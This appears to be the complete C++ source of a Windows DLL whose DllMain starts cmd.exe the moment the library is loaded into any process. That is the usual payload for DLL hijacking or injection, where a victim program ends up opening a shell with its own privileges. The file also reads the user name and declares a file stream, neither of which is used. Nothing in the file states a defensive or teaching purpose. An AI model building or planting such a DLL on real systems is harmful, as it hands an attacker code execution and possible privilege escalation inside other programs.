#include "pch.h"
#include <stdio.h>
#include <windows.h>
#include <Lmcons.h>
#include <fstream>

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	
	STARTUPINFO startInfo = { 0 };
	PROCESS_INFORMATION processInfo = { 0 };

	std::ofstream outdata;
	TCHAR username[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username, &size);

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		CreateProcess(TEXT("C:\\Windows\\System32\\cmd.exe"), NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &startInfo, &processInfo);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}